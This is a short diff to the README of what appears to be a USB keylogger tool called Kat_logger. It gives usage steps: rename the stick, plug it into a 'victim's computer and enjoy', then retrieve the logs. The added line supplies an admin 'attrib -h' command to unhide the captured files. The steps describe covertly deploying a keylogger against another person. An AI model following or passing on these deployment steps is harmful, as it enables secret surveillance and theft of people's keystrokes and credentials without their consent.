@@ -24,7 +24,7 @@
 > - Rename the usb stick to "Data Disk" or if you want to change lable just change it from the variable just change it from python/1.0/Kat_logger.py
 > - That's all
 > - Plug the usb in your victim's computer and enjoy =]
-> - REMEMBER: After a tot unplug it and read it on your pc, 
+> - REMEMBER: After a tot unplug it and read it on your pc, for unhide the file on the usb stick just execute on cmd/powershell as admin "attrib -h *.* /s /d"
 
 
 # DISCLAIMER
